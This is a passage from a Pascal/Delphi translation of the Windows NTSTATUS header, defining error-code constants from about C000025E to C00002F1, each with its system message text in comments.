STATUS_PLUGPLAY_NO_DEVICE        = NTSTATUS($C000025E);

//
// MessageId: STATUS_UNSUPPORTED_COMPRESSION
//
// MessageText:
//
// The specified compression format is unsupported.
//
STATUS_UNSUPPORTED_COMPRESSION   = NTSTATUS($C000025F);

//
// MessageId: STATUS_INVALID_HW_PROFILE
//
// MessageText:
//
// The specified hardware profile configuration is invalid.
//
STATUS_INVALID_HW_PROFILE        = NTSTATUS($C0000260);

//
// MessageId: STATUS_INVALID_PLUGPLAY_DEVICE_PATH
//
// MessageText:
//
// The specified Plug and Play registry device path is invalid.
//
STATUS_INVALID_PLUGPLAY_DEVICE_PATH = NTSTATUS($C0000261);

//
// MessageId: STATUS_DRIVER_ORDINAL_NOT_FOUND
//
// MessageText:
//
// {Driver Entry Point Not Found}
// The %hs device driver could not locate the ordinal %ld in driver %hs.
//
STATUS_DRIVER_ORDINAL_NOT_FOUND  = NTSTATUS($C0000262);

//
// MessageId: STATUS_DRIVER_ENTRYPOINT_NOT_FOUND
//
// MessageText:
//
// {Driver Entry Point Not Found}
// The %hs device driver could not locate the entry point %hs in driver %hs.
//
STATUS_DRIVER_ENTRYPOINT_NOT_FOUND = NTSTATUS($C0000263);

//
// MessageId: STATUS_RESOURCE_NOT_OWNED
//
// MessageText:
//
// {Application Error}
// The application attempted to release a resource it did not own. Click OK to terminate the application.
//
STATUS_RESOURCE_NOT_OWNED        = NTSTATUS($C0000264);

//
// MessageId: STATUS_TOO_MANY_LINKS
//
// MessageText:
//
// An attempt was made to create more links on a file than the file system supports.
//
STATUS_TOO_MANY_LINKS            = NTSTATUS($C0000265);

//
// MessageId: STATUS_QUOTA_LIST_INCONSISTENT
//
// MessageText:
//
// The specified quota list is internally inconsistent with its descriptor.
//
STATUS_QUOTA_LIST_INCONSISTENT   = NTSTATUS($C0000266);

//
// MessageId: STATUS_FILE_IS_OFFLINE
//
// MessageText:
//
// The specified file has been relocated to offline storage.
//
STATUS_FILE_IS_OFFLINE           = NTSTATUS($C0000267);

//
// MessageId: STATUS_EVALUATION_EXPIRATION
//
// MessageText:
//
// {Windows Evaluation Notification}
// The evaluation period for this installation of Windows has expired. This system will shutdown in 1 hour. To restore access to this installation of Windows, please upgrade this installation using a licensed distribution of this product.
//
STATUS_EVALUATION_EXPIRATION     = NTSTATUS($C0000268);

//
// MessageId: STATUS_ILLEGAL_DLL_RELOCATION
//
// MessageText:
//
// {Illegal System DLL Relocation}
// The system DLL %hs was relocated in memory. The application will not run properly. The relocation occurred because the DLL %hs occupied an address range reserved for Windows system DLLs. The vendor supplying the DLL should be contacted for a new DLL.
//
STATUS_ILLEGAL_DLL_RELOCATION    = NTSTATUS($C0000269);

//
// MessageId: STATUS_LICENSE_VIOLATION
//
// MessageText:
//
// {License Violation}
// The system has detected tampering with your registered product type. This is a violation of your software license. Tampering with product type is not permitted.
//
STATUS_LICENSE_VIOLATION         = NTSTATUS($C000026A);

//
// MessageId: STATUS_DLL_INIT_FAILED_LOGOFF
//
// MessageText:
//
// {DLL Initialization Failed}
// The application failed to initialize because the window station is shutting down.
//
STATUS_DLL_INIT_FAILED_LOGOFF    = NTSTATUS($C000026B);

//
// MessageId: STATUS_DRIVER_UNABLE_TO_LOAD
//
// MessageText:
//
// {Unable to Load Device Driver}
// %hs device driver could not be loaded.
// Error Status was 0x%x
//
STATUS_DRIVER_UNABLE_TO_LOAD     = NTSTATUS($C000026C);

//
// MessageId: STATUS_DFS_UNAVAILABLE
//
// MessageText:
//
// DFS is unavailable on the contacted server.
//
STATUS_DFS_UNAVAILABLE           = NTSTATUS($C000026D);

//
// MessageId: STATUS_VOLUME_DISMOUNTED
//
// MessageText:
//
// An operation was attempted to a volume after it was dismounted.
//
STATUS_VOLUME_DISMOUNTED         = NTSTATUS($C000026E);

//
// MessageId: STATUS_WX86_INTERNAL_ERROR
//
// MessageText:
//
// An internal error occurred in the Win32 x86 emulation subsystem.
//
STATUS_WX86_INTERNAL_ERROR       = NTSTATUS($C000026F);

//
// MessageId: STATUS_WX86_FLOAT_STACK_CHECK
//
// MessageText:
//
// Win32 x86 emulation subsystem Floating-point stack check.
//
STATUS_WX86_FLOAT_STACK_CHECK    = NTSTATUS($C0000270);

//
// MessageId: STATUS_VALIDATE_CONTINUE
//
// MessageText:
//
// The validation process needs to continue on to the next step.
//
STATUS_VALIDATE_CONTINUE         = NTSTATUS($C0000271);

//
// MessageId: STATUS_NO_MATCH
//
// MessageText:
//
// There was no match for the specified key in the index.
//
STATUS_NO_MATCH                  = NTSTATUS($C0000272);

//
// MessageId: STATUS_NO_MORE_MATCHES
//
// MessageText:
//
// There are no more matches for the current index enumeration.
//
STATUS_NO_MORE_MATCHES           = NTSTATUS($C0000273);

//
// MessageId: STATUS_NOT_A_REPARSE_POINT
//
// MessageText:
//
// The file or directory is not a reparse point.
//
STATUS_NOT_A_REPARSE_POINT       = NTSTATUS($C0000275);

//
// MessageId: STATUS_IO_REPARSE_TAG_INVALID
//
// MessageText:
//
// The Windows I/O reparse tag passed for the reparse point is invalid.
//
STATUS_IO_REPARSE_TAG_INVALID    = NTSTATUS($C0000276);

//
// MessageId: STATUS_IO_REPARSE_TAG_MISMATCH
//
// MessageText:
//
// The Windows I/O reparse tag does not match the one present in the reparse point.
//
STATUS_IO_REPARSE_TAG_MISMATCH   = NTSTATUS($C0000277);

//
// MessageId: STATUS_IO_REPARSE_DATA_INVALID
//
// MessageText:
//
// The user data passed for the reparse point is invalid.
//
STATUS_IO_REPARSE_DATA_INVALID   = NTSTATUS($C0000278);

//
// MessageId: STATUS_IO_REPARSE_TAG_NOT_HANDLED
//
// MessageText:
//
// The layered file system driver for this IO tag did not handle it when needed.
//
STATUS_IO_REPARSE_TAG_NOT_HANDLED = NTSTATUS($C0000279);

//
// MessageId: STATUS_PWD_TOO_LONG
//
// MessageText:
//
// The password provided is too long to meet the policy of your user account. Please choose a shorter password.
//
STATUS_PWD_TOO_LONG              = NTSTATUS($C000027A);

//
// MessageId: STATUS_STOWED_EXCEPTION
//
// MessageText:
//
// An application-internal exception has occurred.
//
STATUS_STOWED_EXCEPTION          = NTSTATUS($C000027B);

//
// MessageId: STATUS_CONTEXT_STOWED_EXCEPTION
//
// MessageText:
//
// An application-internal exception has occurred.
//
STATUS_CONTEXT_STOWED_EXCEPTION  = NTSTATUS($C000027C);

//
// MessageId: STATUS_REPARSE_POINT_NOT_RESOLVED
//
// MessageText:
//
// The symbolic link could not be resolved even though the initial file name is valid.
//
STATUS_REPARSE_POINT_NOT_RESOLVED = NTSTATUS($C0000280);

//
// MessageId: STATUS_DIRECTORY_IS_A_REPARSE_POINT
//
// MessageText:
//
// The directory is a reparse point.
//
STATUS_DIRECTORY_IS_A_REPARSE_POINT = NTSTATUS($C0000281);

//
// MessageId: STATUS_RANGE_LIST_CONFLICT
//
// MessageText:
//
// The range could not be added to the range list because of a conflict.
//
STATUS_RANGE_LIST_CONFLICT       = NTSTATUS($C0000282);

//
// MessageId: STATUS_SOURCE_ELEMENT_EMPTY
//
// MessageText:
//
// The specified medium changer source element contains no media.
//
STATUS_SOURCE_ELEMENT_EMPTY      = NTSTATUS($C0000283);

//
// MessageId: STATUS_DESTINATION_ELEMENT_FULL
//
// MessageText:
//
// The specified medium changer destination element already contains media.
//
STATUS_DESTINATION_ELEMENT_FULL  = NTSTATUS($C0000284);

//
// MessageId: STATUS_ILLEGAL_ELEMENT_ADDRESS
//
// MessageText:
//
// The specified medium changer element does not exist.
//
STATUS_ILLEGAL_ELEMENT_ADDRESS   = NTSTATUS($C0000285);

//
// MessageId: STATUS_MAGAZINE_NOT_PRESENT
//
// MessageText:
//
// The specified element is contained within a magazine that is no longer present.
//
STATUS_MAGAZINE_NOT_PRESENT      = NTSTATUS($C0000286);

//
// MessageId: STATUS_REINITIALIZATION_NEEDED
//
// MessageText:
//
// The device requires reinitialization due to hardware errors.
//
STATUS_REINITIALIZATION_NEEDED   = NTSTATUS($C0000287);

//
// MessageId: STATUS_DEVICE_REQUIRES_CLEANING
//
// MessageText:
//
// The device has indicated that cleaning is necessary.
//
STATUS_DEVICE_REQUIRES_CLEANING  = NTSTATUS($80000288);

//
// MessageId: STATUS_DEVICE_DOOR_OPEN
//
// MessageText:
//
// The device has indicated that its door is open. Further operations require it closed and secured.
//
STATUS_DEVICE_DOOR_OPEN          = NTSTATUS($80000289);

//
// MessageId: STATUS_ENCRYPTION_FAILED
//
// MessageText:
//
// The file encryption attempt failed.
//
STATUS_ENCRYPTION_FAILED         = NTSTATUS($C000028A);

//
// MessageId: STATUS_DECRYPTION_FAILED
//
// MessageText:
//
// The file decryption attempt failed.
//
STATUS_DECRYPTION_FAILED         = NTSTATUS($C000028B);

//
// MessageId: STATUS_RANGE_NOT_FOUND
//
// MessageText:
//
// The specified range could not be found in the range list.
//
STATUS_RANGE_NOT_FOUND           = NTSTATUS($C000028C);

//
// MessageId: STATUS_NO_RECOVERY_POLICY
//
// MessageText:
//
// There is no encryption recovery policy configured for this system.
//
STATUS_NO_RECOVERY_POLICY        = NTSTATUS($C000028D);

//
// MessageId: STATUS_NO_EFS
//
// MessageText:
//
// The required encryption driver is not loaded for this system.
//
STATUS_NO_EFS                    = NTSTATUS($C000028E);

//
// MessageId: STATUS_WRONG_EFS
//
// MessageText:
//
// The file was encrypted with a different encryption driver than is currently loaded.
//
STATUS_WRONG_EFS                 = NTSTATUS($C000028F);

//
// MessageId: STATUS_NO_USER_KEYS
//
// MessageText:
//
// There are no EFS keys defined for the user.
//
STATUS_NO_USER_KEYS              = NTSTATUS($C0000290);

//
// MessageId: STATUS_FILE_NOT_ENCRYPTED
//
// MessageText:
//
// The specified file is not encrypted.
//
STATUS_FILE_NOT_ENCRYPTED        = NTSTATUS($C0000291);

//
// MessageId: STATUS_NOT_EXPORT_FORMAT
//
// MessageText:
//
// The specified file is not in the defined EFS export format.
//
STATUS_NOT_EXPORT_FORMAT         = NTSTATUS($C0000292);

//
// MessageId: STATUS_FILE_ENCRYPTED
//
// MessageText:
//
// The specified file is encrypted and the user does not have the ability to decrypt it.
//
STATUS_FILE_ENCRYPTED            = NTSTATUS($C0000293);

//
// MessageId: STATUS_WAKE_SYSTEM
//
// MessageText:
//
// The system has awoken
//
STATUS_WAKE_SYSTEM               = NTSTATUS($40000294);

//
// MessageId: STATUS_WMI_GUID_NOT_FOUND
//
// MessageText:
//
// The guid passed was not recognized as valid by a WMI data provider.
//
STATUS_WMI_GUID_NOT_FOUND        = NTSTATUS($C0000295);

//
// MessageId: STATUS_WMI_INSTANCE_NOT_FOUND
//
// MessageText:
//
// The instance name passed was not recognized as valid by a WMI data provider.
//
STATUS_WMI_INSTANCE_NOT_FOUND    = NTSTATUS($C0000296);

//
// MessageId: STATUS_WMI_ITEMID_NOT_FOUND
//
// MessageText:
//
// The data item id passed was not recognized as valid by a WMI data provider.
//
STATUS_WMI_ITEMID_NOT_FOUND      = NTSTATUS($C0000297);

//
// MessageId: STATUS_WMI_TRY_AGAIN
//
// MessageText:
//
// The WMI request could not be completed and should be retried.
//
STATUS_WMI_TRY_AGAIN             = NTSTATUS($C0000298);

//
// MessageId: STATUS_SHARED_POLICY
//
// MessageText:
//
// The policy object is shared and can only be modified at the root
//
STATUS_SHARED_POLICY             = NTSTATUS($C0000299);

//
// MessageId: STATUS_POLICY_OBJECT_NOT_FOUND
//
// MessageText:
//
// The policy object does not exist when it should
//
STATUS_POLICY_OBJECT_NOT_FOUND   = NTSTATUS($C000029A);

//
// MessageId: STATUS_POLICY_ONLY_IN_DS
//
// MessageText:
//
// The requested policy information only lives in the Ds
//
STATUS_POLICY_ONLY_IN_DS         = NTSTATUS($C000029B);

//
// MessageId: STATUS_VOLUME_NOT_UPGRADED
//
// MessageText:
//
// The volume must be upgraded to enable this feature
//
STATUS_VOLUME_NOT_UPGRADED       = NTSTATUS($C000029C);

//
// MessageId: STATUS_REMOTE_STORAGE_NOT_ACTIVE
//
// MessageText:
//
// The remote storage service is not operational at this time.
//
STATUS_REMOTE_STORAGE_NOT_ACTIVE = NTSTATUS($C000029D);

//
// MessageId: STATUS_REMOTE_STORAGE_MEDIA_ERROR
//
// MessageText:
//
// The remote storage service encountered a media error.
//
STATUS_REMOTE_STORAGE_MEDIA_ERROR = NTSTATUS($C000029E);

//
// MessageId: STATUS_NO_TRACKING_SERVICE
//
// MessageText:
//
// The tracking (workstation) service is not running.
//
STATUS_NO_TRACKING_SERVICE       = NTSTATUS($C000029F);

//
// MessageId: STATUS_SERVER_SID_MISMATCH
//
// MessageText:
//
// The server process is running under a SID different than that required by client.
//
STATUS_SERVER_SID_MISMATCH       = NTSTATUS($C00002A0);

//
// Directory Service specific Errors
//
//
// MessageId: STATUS_DS_NO_ATTRIBUTE_OR_VALUE
//
// MessageText:
//
// The specified directory service attribute or value does not exist.
//
STATUS_DS_NO_ATTRIBUTE_OR_VALUE  = NTSTATUS($C00002A1);

//
// MessageId: STATUS_DS_INVALID_ATTRIBUTE_SYNTAX
//
// MessageText:
//
// The attribute syntax specified to the directory service is invalid.
//
STATUS_DS_INVALID_ATTRIBUTE_SYNTAX = NTSTATUS($C00002A2);

//
// MessageId: STATUS_DS_ATTRIBUTE_TYPE_UNDEFINED
//
// MessageText:
//
// The attribute type specified to the directory service is not defined.
//
STATUS_DS_ATTRIBUTE_TYPE_UNDEFINED = NTSTATUS($C00002A3);

//
// MessageId: STATUS_DS_ATTRIBUTE_OR_VALUE_EXISTS
//
// MessageText:
//
// The specified directory service attribute or value already exists.
//
STATUS_DS_ATTRIBUTE_OR_VALUE_EXISTS = NTSTATUS($C00002A4);

//
// MessageId: STATUS_DS_BUSY
//
// MessageText:
//
// The directory service is busy.
//
STATUS_DS_BUSY                   = NTSTATUS($C00002A5);

//
// MessageId: STATUS_DS_UNAVAILABLE
//
// MessageText:
//
// The directory service is not available.
//
STATUS_DS_UNAVAILABLE            = NTSTATUS($C00002A6);

//
// MessageId: STATUS_DS_NO_RIDS_ALLOCATED
//
// MessageText:
//
// The directory service was unable to allocate a relative identifier.
//
STATUS_DS_NO_RIDS_ALLOCATED      = NTSTATUS($C00002A7);

//
// MessageId: STATUS_DS_NO_MORE_RIDS
//
// MessageText:
//
// The directory service has exhausted the pool of relative identifiers.
//
STATUS_DS_NO_MORE_RIDS           = NTSTATUS($C00002A8);

//
// MessageId: STATUS_DS_INCORRECT_ROLE_OWNER
//
// MessageText:
//
// The requested operation could not be performed because the directory service is not the master for that type of operation.
//
STATUS_DS_INCORRECT_ROLE_OWNER   = NTSTATUS($C00002A9);

//
// MessageId: STATUS_DS_RIDMGR_INIT_ERROR
//
// MessageText:
//
// The directory service was unable to initialize the subsystem that allocates relative identifiers.
//
STATUS_DS_RIDMGR_INIT_ERROR      = NTSTATUS($C00002AA);

//
// MessageId: STATUS_DS_OBJ_CLASS_VIOLATION
//
// MessageText:
//
// The requested operation did not satisfy one or more constraints associated with the class of the object.
//
STATUS_DS_OBJ_CLASS_VIOLATION    = NTSTATUS($C00002AB);

//
// MessageId: STATUS_DS_CANT_ON_NON_LEAF
//
// MessageText:
//
// The directory service can perform the requested operation only on a leaf object.
//
STATUS_DS_CANT_ON_NON_LEAF       = NTSTATUS($C00002AC);

//
// MessageId: STATUS_DS_CANT_ON_RDN
//
// MessageText:
//
// The directory service cannot perform the requested operation on the Relatively Defined Name (RDN) attribute of an object.
//
STATUS_DS_CANT_ON_RDN            = NTSTATUS($C00002AD);

//
// MessageId: STATUS_DS_CANT_MOD_OBJ_CLASS
//
// MessageText:
//
// The directory service detected an attempt to modify the object class of an object.
//
STATUS_DS_CANT_MOD_OBJ_CLASS     = NTSTATUS($C00002AE);

//
// MessageId: STATUS_DS_CROSS_DOM_MOVE_FAILED
//
// MessageText:
//
// An error occurred while performing a cross domain move operation.
//
STATUS_DS_CROSS_DOM_MOVE_FAILED  = NTSTATUS($C00002AF);

//
// MessageId: STATUS_DS_GC_NOT_AVAILABLE
//
// MessageText:
//
// Unable to Contact the Global Catalog Server.
//
STATUS_DS_GC_NOT_AVAILABLE       = NTSTATUS($C00002B0);

//
// MessageId: STATUS_DIRECTORY_SERVICE_REQUIRED
//
// MessageText:
//
// The requested operation requires a directory service, and none was available.
//
STATUS_DIRECTORY_SERVICE_REQUIRED = NTSTATUS($C00002B1);

//
// MessageId: STATUS_REPARSE_ATTRIBUTE_CONFLICT
//
// MessageText:
//
// The reparse attribute cannot be set as it is incompatible with an existing attribute.
//
STATUS_REPARSE_ATTRIBUTE_CONFLICT = NTSTATUS($C00002B2);

//
// MessageId: STATUS_CANT_ENABLE_DENY_ONLY
//
// MessageText:
//
// A group marked use for deny only cannot be enabled.
//
STATUS_CANT_ENABLE_DENY_ONLY     = NTSTATUS($C00002B3);

//
// MessageId: STATUS_FLOAT_MULTIPLE_FAULTS
//
// MessageText:
//
// {EXCEPTION}
// Multiple floating point faults.
//
STATUS_FLOAT_MULTIPLE_FAULTS     = NTSTATUS($C00002B4);    // winnt

//
// MessageId: STATUS_FLOAT_MULTIPLE_TRAPS
//
// MessageText:
//
// {EXCEPTION}
// Multiple floating point traps.
//
STATUS_FLOAT_MULTIPLE_TRAPS      = NTSTATUS($C00002B5);    // winnt

//
// MessageId: STATUS_DEVICE_REMOVED
//
// MessageText:
//
// The device has been removed.
//
STATUS_DEVICE_REMOVED            = NTSTATUS($C00002B6);

//
// MessageId: STATUS_JOURNAL_DELETE_IN_PROGRESS
//
// MessageText:
//
// The volume change journal is being deleted.
//
STATUS_JOURNAL_DELETE_IN_PROGRESS = NTSTATUS($C00002B7);

//
// MessageId: STATUS_JOURNAL_NOT_ACTIVE
//
// MessageText:
//
// The volume change journal is not active.
//
STATUS_JOURNAL_NOT_ACTIVE        = NTSTATUS($C00002B8);

//
// MessageId: STATUS_NOINTERFACE
//
// MessageText:
//
// The requested interface is not supported.
//
STATUS_NOINTERFACE               = NTSTATUS($C00002B9);

//
// MessageId: STATUS_DS_RIDMGR_DISABLED
//
// MessageText:
//
// The directory service detected the subsystem that allocates relative identifiers is disabled. This can occur as a protective mechanism when the system determines a significant portion of relative identifiers (RIDs) have been exhausted. Please see http://go.microsoft.com/fwlink/?LinkId=228610 for recommended diagnostic steps and the procedure to re-enable account creation.
//
STATUS_DS_RIDMGR_DISABLED        = NTSTATUS($C00002BA);

//
// MessageId: STATUS_DS_ADMIN_LIMIT_EXCEEDED
//
// MessageText:
//
// A directory service resource limit has been exceeded.
//
STATUS_DS_ADMIN_LIMIT_EXCEEDED   = NTSTATUS($C00002C1);

//
// MessageId: STATUS_DRIVER_FAILED_SLEEP
//
// MessageText:
//
// {System Standby Failed}
// The driver %hs does not support standby mode. Updating this driver may allow the system to go to standby mode.
//
STATUS_DRIVER_FAILED_SLEEP       = NTSTATUS($C00002C2);

//
// MessageId: STATUS_MUTUAL_AUTHENTICATION_FAILED
//
// MessageText:
//
// Mutual Authentication failed. The server's password is out of date at the domain controller.
//
STATUS_MUTUAL_AUTHENTICATION_FAILED = NTSTATUS($C00002C3);

//
// MessageId: STATUS_CORRUPT_SYSTEM_FILE
//
// MessageText:
//
// The system file %1 has become corrupt and has been replaced.
//
STATUS_CORRUPT_SYSTEM_FILE       = NTSTATUS($C00002C4);

//
// MessageId: STATUS_DATATYPE_MISALIGNMENT_ERROR
//
// MessageText:
//
// {EXCEPTION}
// Alignment Error
// A datatype misalignment error was detected in a load or store instruction.
//
STATUS_DATATYPE_MISALIGNMENT_ERROR = NTSTATUS($C00002C5);

//
// MessageId: STATUS_WMI_READ_ONLY
//
// MessageText:
//
// The WMI data item or data block is read only.
//
STATUS_WMI_READ_ONLY             = NTSTATUS($C00002C6);

//
// MessageId: STATUS_WMI_SET_FAILURE
//
// MessageText:
//
// The WMI data item or data block could not be changed.
//
STATUS_WMI_SET_FAILURE           = NTSTATUS($C00002C7);

//
// MessageId: STATUS_COMMITMENT_MINIMUM
//
// MessageText:
//
// {Virtual Memory Minimum Too Low}
// Your system is low on virtual memory. Windows is increasing the size of your virtual memory paging file. During this process, memory requests for some applications may be denied. For more information, see Help.
//
STATUS_COMMITMENT_MINIMUM        = NTSTATUS($C00002C8);

//
// MessageId: STATUS_REG_NAT_CONSUMPTION
//
// MessageText:
//
// {EXCEPTION}
// Register NaT consumption faults.
// A NaT value is consumed on a non speculative instruction.
//
STATUS_REG_NAT_CONSUMPTION       = NTSTATUS($C00002C9);    // winnt

//
// MessageId: STATUS_TRANSPORT_FULL
//
// MessageText:
//
// The medium changer's transport element contains media, which is causing the operation to fail.
//
STATUS_TRANSPORT_FULL            = NTSTATUS($C00002CA);

//
// MessageId: STATUS_DS_SAM_INIT_FAILURE
//
// MessageText:
//
// Security Accounts Manager initialization failed because of the following error:
// %hs
// Error Status: 0x%x.
// Please shutdown this system and reboot into Directory Services Restore Mode, check the event log for more detailed information.
//
STATUS_DS_SAM_INIT_FAILURE       = NTSTATUS($C00002CB);

//
// MessageId: STATUS_ONLY_IF_CONNECTED
//
// MessageText:
//
// This operation is supported only when you are connected to the server.
//
STATUS_ONLY_IF_CONNECTED         = NTSTATUS($C00002CC);

//
// MessageId: STATUS_DS_SENSITIVE_GROUP_VIOLATION
//
// MessageText:
//
// Only an administrator can modify the membership list of an administrative group.
//
STATUS_DS_SENSITIVE_GROUP_VIOLATION = NTSTATUS($C00002CD);

//
// MessageId: STATUS_PNP_RESTART_ENUMERATION
//
// MessageText:
//
// A device was removed so enumeration must be restarted.
//
STATUS_PNP_RESTART_ENUMERATION   = NTSTATUS($C00002CE);

//
// MessageId: STATUS_JOURNAL_ENTRY_DELETED
//
// MessageText:
//
// The journal entry has been deleted from the journal.
//
STATUS_JOURNAL_ENTRY_DELETED     = NTSTATUS($C00002CF);

//
// MessageId: STATUS_DS_CANT_MOD_PRIMARYGROUPID
//
// MessageText:
//
// Cannot change the primary group ID of a domain controller account.
//
STATUS_DS_CANT_MOD_PRIMARYGROUPID = NTSTATUS($C00002D0);

//
// MessageId: STATUS_SYSTEM_IMAGE_BAD_SIGNATURE
//
// MessageText:
//
// {Fatal System Error}
// The system image %s is not properly signed. The file has been replaced with the signed file. The system has been shut down.
//
STATUS_SYSTEM_IMAGE_BAD_SIGNATURE = NTSTATUS($C00002D1);

//
// MessageId: STATUS_PNP_REBOOT_REQUIRED
//
// MessageText:
//
// Device will not start without a reboot.
//
STATUS_PNP_REBOOT_REQUIRED       = NTSTATUS($C00002D2);

//
// MessageId: STATUS_POWER_STATE_INVALID
//
// MessageText:
//
// Current device power state cannot support this request.
//
STATUS_POWER_STATE_INVALID       = NTSTATUS($C00002D3);

//
// MessageId: STATUS_DS_INVALID_GROUP_TYPE
//
// MessageText:
//
// The specified group type is invalid.
//
STATUS_DS_INVALID_GROUP_TYPE     = NTSTATUS($C00002D4);

//
// MessageId: STATUS_DS_NO_NEST_GLOBALGROUP_IN_MIXEDDOMAIN
//
// MessageText:
//
// In mixed domain no nesting of global group if group is security enabled.
//
STATUS_DS_NO_NEST_GLOBALGROUP_IN_MIXEDDOMAIN = NTSTATUS($C00002D5);

//
// MessageId: STATUS_DS_NO_NEST_LOCALGROUP_IN_MIXEDDOMAIN
//
// MessageText:
//
// In mixed domain, cannot nest local groups with other local groups, if the group is security enabled.
//
STATUS_DS_NO_NEST_LOCALGROUP_IN_MIXEDDOMAIN = NTSTATUS($C00002D6);

//
// MessageId: STATUS_DS_GLOBAL_CANT_HAVE_LOCAL_MEMBER
//
// MessageText:
//
// A global group cannot have a local group as a member.
//
STATUS_DS_GLOBAL_CANT_HAVE_LOCAL_MEMBER = NTSTATUS($C00002D7);

//
// MessageId: STATUS_DS_GLOBAL_CANT_HAVE_UNIVERSAL_MEMBER
//
// MessageText:
//
// A global group cannot have a universal group as a member.
//
STATUS_DS_GLOBAL_CANT_HAVE_UNIVERSAL_MEMBER = NTSTATUS($C00002D8);

//
// MessageId: STATUS_DS_UNIVERSAL_CANT_HAVE_LOCAL_MEMBER
//
// MessageText:
//
// A universal group cannot have a local group as a member.
//
STATUS_DS_UNIVERSAL_CANT_HAVE_LOCAL_MEMBER = NTSTATUS($C00002D9);

//
// MessageId: STATUS_DS_GLOBAL_CANT_HAVE_CROSSDOMAIN_MEMBER
//
// MessageText:
//
// A global group cannot have a cross domain member.
//
STATUS_DS_GLOBAL_CANT_HAVE_CROSSDOMAIN_MEMBER = NTSTATUS($C00002DA);

//
// MessageId: STATUS_DS_LOCAL_CANT_HAVE_CROSSDOMAIN_LOCAL_MEMBER
//
// MessageText:
//
// A local group cannot have another cross domain local group as a member.
//
STATUS_DS_LOCAL_CANT_HAVE_CROSSDOMAIN_LOCAL_MEMBER = NTSTATUS($C00002DB);

//
// MessageId: STATUS_DS_HAVE_PRIMARY_MEMBERS
//
// MessageText:
//
// Cannot change to security disabled group because of having primary members in this group.
//
STATUS_DS_HAVE_PRIMARY_MEMBERS   = NTSTATUS($C00002DC);

//
// MessageId: STATUS_WMI_NOT_SUPPORTED
//
// MessageText:
//
// The WMI operation is not supported by the data block or method.
//
STATUS_WMI_NOT_SUPPORTED         = NTSTATUS($C00002DD);

//
// MessageId: STATUS_INSUFFICIENT_POWER
//
// MessageText:
//
// There is not enough power to complete the requested operation.
//
STATUS_INSUFFICIENT_POWER        = NTSTATUS($C00002DE);

//
// MessageId: STATUS_SAM_NEED_BOOTKEY_PASSWORD
//
// MessageText:
//
// Security Account Manager needs to get the boot password.
//
STATUS_SAM_NEED_BOOTKEY_PASSWORD = NTSTATUS($C00002DF);

//
// MessageId: STATUS_SAM_NEED_BOOTKEY_FLOPPY
//
// MessageText:
//
// Security Account Manager needs to get the boot key from floppy disk.
//
STATUS_SAM_NEED_BOOTKEY_FLOPPY   = NTSTATUS($C00002E0);

//
// MessageId: STATUS_DS_CANT_START
//
// MessageText:
//
// Directory Service cannot start.
//
STATUS_DS_CANT_START             = NTSTATUS($C00002E1);

//
// MessageId: STATUS_DS_INIT_FAILURE
//
// MessageText:
//
// Directory Services could not start because of the following error:
// %hs
// Error Status: 0x%x.
// Please shutdown this system and reboot into Directory Services Restore Mode, check the event log for more detailed information.
//
STATUS_DS_INIT_FAILURE           = NTSTATUS($C00002E2);

//
// MessageId: STATUS_SAM_INIT_FAILURE
//
// MessageText:
//
// Security Accounts Manager initialization failed because of the following error:
// %hs
// Error Status: 0x%x.
// Please click OK to shutdown this system and reboot into Safe Mode, check the event log for more detailed information.
//
STATUS_SAM_INIT_FAILURE          = NTSTATUS($C00002E3);

//
// MessageId: STATUS_DS_GC_REQUIRED
//
// MessageText:
//
// The requested operation can be performed only on a global catalog server.
//
STATUS_DS_GC_REQUIRED            = NTSTATUS($C00002E4);

//
// MessageId: STATUS_DS_LOCAL_MEMBER_OF_LOCAL_ONLY
//
// MessageText:
//
// A local group can only be a member of other local groups in the same domain.
//
STATUS_DS_LOCAL_MEMBER_OF_LOCAL_ONLY = NTSTATUS($C00002E5);

//
// MessageId: STATUS_DS_NO_FPO_IN_UNIVERSAL_GROUPS
//
// MessageText:
//
// Foreign security principals cannot be members of universal groups.
//
STATUS_DS_NO_FPO_IN_UNIVERSAL_GROUPS = NTSTATUS($C00002E6);

//
// MessageId: STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED
//
// MessageText:
//
// Your computer could not be joined to the domain. You have exceeded the maximum number of computer accounts you are allowed to create in this domain. Contact your system administrator to have this limit reset or increased.
//
STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED = NTSTATUS($C00002E7);

//
// MessageId: STATUS_MULTIPLE_FAULT_VIOLATION
//
// MessageText:
//
//  STATUS_MULTIPLE_FAULT_VIOLATION
//
STATUS_MULTIPLE_FAULT_VIOLATION  = NTSTATUS($C00002E8);

//
// MessageId: STATUS_CURRENT_DOMAIN_NOT_ALLOWED
//
// MessageText:
//
// This operation cannot be performed on the current domain.
//
STATUS_CURRENT_DOMAIN_NOT_ALLOWED = NTSTATUS($C00002E9);

//
// MessageId: STATUS_CANNOT_MAKE
//
// MessageText:
//
// The directory or file cannot be created.
//
STATUS_CANNOT_MAKE               = NTSTATUS($C00002EA);

//
// MessageId: STATUS_SYSTEM_SHUTDOWN
//
// MessageText:
//
// The system is in the process of shutting down.
//
STATUS_SYSTEM_SHUTDOWN           = NTSTATUS($C00002EB);

//
// MessageId: STATUS_DS_INIT_FAILURE_CONSOLE
//
// MessageText:
//
// Directory Services could not start because of the following error:
// %hs
// Error Status: 0x%x.
// Please click OK to shutdown the system. You can use the recovery console to diagnose the system further.
//
STATUS_DS_INIT_FAILURE_CONSOLE   = NTSTATUS($C00002EC);

//
// MessageId: STATUS_DS_SAM_INIT_FAILURE_CONSOLE
//
// MessageText:
//
// Security Accounts Manager initialization failed because of the following error:
// %hs
// Error Status: 0x%x.
// Please click OK to shutdown the system. You can use the recovery console to diagnose the system further.
//
STATUS_DS_SAM_INIT_FAILURE_CONSOLE = NTSTATUS($C00002ED);

//
// MessageId: STATUS_UNFINISHED_CONTEXT_DELETED
//
// MessageText:
//
// A security context was deleted before the context was completed. This is considered a logon failure.
//
STATUS_UNFINISHED_CONTEXT_DELETED = NTSTATUS($C00002EE);

//
// MessageId: STATUS_NO_TGT_REPLY
//
// MessageText:
//
// The client is trying to negotiate a context and the server requires user-to-user but didn't send a TGT reply.
//
STATUS_NO_TGT_REPLY              = NTSTATUS($C00002EF);

//
// MessageId: STATUS_OBJECTID_NOT_FOUND
//
// MessageText:
//
// An object ID was not found in the file.
//
STATUS_OBJECTID_NOT_FOUND        = NTSTATUS($C00002F0);

//
// MessageId: STATUS_NO_IP_ADDRESSES
//
// MessageText:
//
// Unable to accomplish the requested task because the local machine does not have any IP addresses.
//
STATUS_NO_IP_ADDRESSES           = NTSTATUS($C00002F1);

//
